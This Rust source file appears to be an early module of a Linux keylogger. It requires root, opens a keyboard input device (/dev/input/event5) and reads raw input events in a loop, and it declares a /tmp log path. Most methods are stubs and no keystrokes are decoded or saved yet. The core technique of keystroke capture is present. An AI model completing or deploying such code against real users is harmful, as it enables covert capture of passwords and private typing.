use std::{
    fs::File,
    io::Read,
    str, 
    mem,
};

use crate::common::Common;
use super::input::InputEvent;

const EVENT_PATH: &str = "/dev/input/event5";
const DATA_PATH: &str = "/tmp/data.log";

pub struct Keylogger { }

impl Common for Keylogger {
    fn find_keyboard(&self) -> bool {
        true
    }

    fn start_logging(&self) {
        check_root();

        let mut buf: [u8; 24] = unsafe { mem::zeroed() };  

        let mut device_file = File::open(EVENT_PATH).unwrap_or_else(|e| panic!("Could not open device file: {}", e) );
        let ev_size = mem::size_of::<InputEvent>();

        loop {
            match device_file.read(&mut buf) {
                Ok(num) => {
                    println!("{}", num);

                    if num != ev_size {
                        panic!("Error while reading!");
                    }
                },
                Err(e) => panic!("Could not read: {}", e)
            }

            // let numread = match file.read(&mut buf) {
            //     Ok(n) => n,
            //     Err(e) => {
            //         println!("Could not read: {}", e);
            //     }
            // };
            //
            // match str::from_utf8(&buf) {
            //     Ok(s) => println!("Read {} bytes! Contents: {}", numread, s),
            //     Err(e) => {
            //         println!("Could not convert: {}", e);
            //         continue;
            //     }
            // }
        }
    }

    fn stop_logging(&self) {

    }

    fn log_keystroke(&self) -> char {
        'h'
    }
}

fn check_root() {
    let euid = unsafe { libc::geteuid() };
    if euid != 0 {
        panic!("Must run as root user");
    }
}
